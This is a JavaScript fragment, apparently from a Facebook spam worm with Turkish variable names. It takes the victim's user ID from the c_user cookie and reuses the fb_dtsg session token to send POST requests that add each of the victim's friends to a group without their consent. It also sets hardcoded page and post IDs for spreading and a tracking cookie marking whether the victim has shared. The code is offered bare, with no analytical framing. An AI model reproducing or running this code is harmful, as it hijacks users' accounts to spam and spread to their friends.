    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "189965517753275";
var spost_id = "189965517753275";
var sfoto_id = "189965517753275";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}